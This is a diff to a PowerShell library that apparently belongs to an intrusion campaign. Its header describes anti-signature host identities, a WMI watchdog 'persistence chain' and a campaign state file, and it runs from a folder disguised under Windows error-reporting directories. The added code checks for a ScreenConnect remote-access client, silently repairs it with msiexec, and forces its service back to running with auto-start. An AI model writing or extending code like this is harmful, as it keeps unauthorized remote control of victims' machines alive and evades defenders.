@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L4
+# OWN_LIB  BUILD 20260802L5
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
 # L2: safe task-name pools (parents exist on all Win10/11), IDENTVER
@@ -13,7 +13,7 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true)]
-    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'state', 'identity', 'repair', 'exterminate')]
+    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate')]
     [string]$Action,
     [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
     [string]$MonPath = '',
@@ -125,13 +125,29 @@ function Ensure-Watchdog {
     return 'OK'
 }
 
+function Test-SCRegistered([string]$Fingerprint) {
+    if (-not $Fingerprint) { return 'no' }
+    $name = "ScreenConnect Client ($Fingerprint)"
+    foreach ($root in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+                      'HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall') {
+        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
+            $dn = (Get-ItemProperty $_.PSPath).DisplayName
+            if ($dn -and $dn -like "*$name*" -and $_.PSChildName -like '{*}') { return 'yes' }
+        }
+    }
+    return 'no'
+}
+
 function Repair-SCService([string]$Fingerprint) {
     # Recreates a deleted SC service entry by repairing the REGISTERED product.
     # msiexec /fa {GUID} repairs in place - it does NOT run the SC-family
     # major-upgrade removal, so other instances are untouched.
+    # L5: also handles present-but-STOPPED services (repair restores binaries,
+    # then start). Only a Running service is considered healthy.
     if (-not $Fingerprint) { return 'no-fp' }
     $name = "ScreenConnect Client ($Fingerprint)"
-    if (Get-Service -Name $name -ErrorAction SilentlyContinue) { return 'svc-present' }
+    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
+    if ($svc -and $svc.Status -eq 'Running') { return 'svc-running' }
     $guid = $null
     foreach ($root in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                       'HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall') {
@@ -146,7 +162,12 @@ function Repair-SCService([string]$Fingerprint) {
     $log = Join-Path $WorkDir "msi_repair_$Fingerprint.log"
     $p = Start-Process msiexec.exe -ArgumentList "/fa $guid /qn /norestart /L*v `"$log`"" -Wait -PassThru
     Start-Sleep -Seconds 8
-    if (Get-Service -Name $name -ErrorAction SilentlyContinue) { return "svc-restored exit=$($p.ExitCode)" }
+    & sc.exe config "$name" start= auto 2>&1 | Out-Null
+    & sc.exe start "$name" 2>&1 | Out-Null
+    Start-Sleep -Seconds 4
+    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
+    if ($svc -and $svc.Status -eq 'Running') { return "svc-restored exit=$($p.ExitCode)" }
+    if ($svc) { return "svc-still-stopped exit=$($p.ExitCode)" }
     return "svc-still-missing exit=$($p.ExitCode)"
 }
 
@@ -328,5 +349,6 @@ switch ($Action) {
     'watchdog-ensure' { Ensure-Watchdog }
     'state'           { Update-State | ConvertTo-Json -Compress }
     'repair'          { Repair-SCService $Fp }
+    'registered'      { Test-SCRegistered $Fp }
     'exterminate'     { Invoke-Exterminate }
 }
